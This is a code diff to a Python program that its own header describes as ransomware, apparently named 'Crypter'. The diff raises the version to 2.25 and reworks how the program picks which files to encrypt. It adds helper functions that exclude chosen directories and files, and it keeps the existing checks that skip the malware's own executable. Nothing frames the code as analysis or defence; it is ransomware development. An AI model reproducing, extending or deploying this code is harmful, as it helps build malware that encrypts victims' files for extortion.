@@ -1,7 +1,7 @@
 '''
 @summary: Crypter: Ransomware written entirely in python.
 @author: MLS
-@version: 2.20
+@version: 2.25
 '''
 
 # Import libs
@@ -231,7 +231,8 @@ class Crypter(Base.Base):
             # Check file is valid
             if (
                 (self.is_valid_filetype(file)) and
-                (file.lower() not in self.FILES_TO_EXCLUDE) and
+                (not self.is_excluded_file(file)) and
+                (not self.is_excluded_dir(path)) and
                 (file.lower() != binary_name.lower()) and
                 (not os.path.join(path, file).lower().startswith(win32file.GetLongPathName(sys._MEIPASS).lower()))
                 ):
@@ -241,7 +242,8 @@ class Crypter(Base.Base):
             # Check file is valid
             if (
                 (self.is_valid_filetype(file)) and
-                (file.lower() not in self.FILES_TO_EXCLUDE) and
+                (not self.is_excluded_file(file)) and
+                (not self.is_excluded_dir(path)) and
                 (file.lower() != binary_name.lower()) and
                 (not os.path.join(path, file).lower().startswith(win32file.GetLongPathName(sys._MEIPASS).lower()))
                 ):
@@ -249,6 +251,35 @@ class Crypter(Base.Base):
 
 
     return file_list
+
+
+  def is_excluded_dir(self, path):
+      '''
+      @summary: Checks whether the specified path should be excluded from encryption
+      @param path: The path to check
+      @return: True if the path should be excluded from encryption, otherwise False
+      @todo: Test
+      '''
+      
+      for dir_to_exclude in self.DIRS_TO_EXCLUDE:
+          if "\\%s" % dir_to_exclude.lower() in path.lower():
+              return True
+          
+      return False
+
+
+  def is_excluded_file(self, file):
+      '''
+      @summary: Checks whether the specified file is marked as a file to be excluded from encryption
+      @param file: The file to check
+      @requires: True if the file should be excluded from encryption, otherwise false
+      @todo: Test
+      '''
+      
+      if file.lower() in self.FILES_TO_EXCLUDE:
+          return True
+      else:
+          return False
 
 
   def is_valid_filetype(self, file):
